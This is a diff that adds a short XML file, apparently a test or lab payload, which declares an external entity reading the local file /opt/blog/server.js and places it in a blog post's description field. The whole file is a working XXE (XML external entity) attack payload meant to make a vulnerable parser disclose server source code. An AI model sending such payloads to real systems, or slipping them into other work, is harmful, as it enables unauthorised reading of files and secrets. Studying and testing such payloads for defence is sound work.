@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ELEMENT stockCheck ANY>
+<!ENTITY file SYSTEM "file:///opt/blog/server.js">
+]>
+<post><title>Example Post</title><description>&file;</description><markdown>Example Markdown</markdown></post>
